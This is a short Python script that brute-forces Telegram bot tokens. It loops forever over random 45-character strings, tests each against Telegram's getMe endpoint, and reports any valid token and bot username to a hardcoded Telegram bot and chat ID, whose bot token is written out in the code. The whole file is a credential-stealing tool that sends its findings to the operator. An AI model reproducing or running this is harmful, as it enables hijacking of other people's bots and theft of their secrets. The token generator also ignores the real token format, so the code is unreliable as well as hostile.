import requests
import random
import string
from telegram import Bot

# Your bot's token where you want to send the found tokens
YOUR_BOT_TOKEN = '5583773090:AAF-fazf-qderti_gq1yPf2Avk1Z3Gq7cKI'
CHAT_ID = '5079629749'

def generate_random_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=45))

def check_token(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()['result']
    return None

def send_message_to_admin(message):
    bot = Bot(token=YOUR_BOT_TOKEN)
    bot.send_message(chat_id=CHAT_ID, text=message)

def main():
    # Notify admin that the bot has started
    send_message_to_admin("Bot started and checking for valid tokens...")

    while True:
        random_token = generate_random_token()
        result = check_token(random_token)
        if result:
            username = result['username']
            message = f"Valid token found: {random_token}\nUsername: {username}"
            send_message_to_admin(message)

if __name__ == "__main__":
    main()
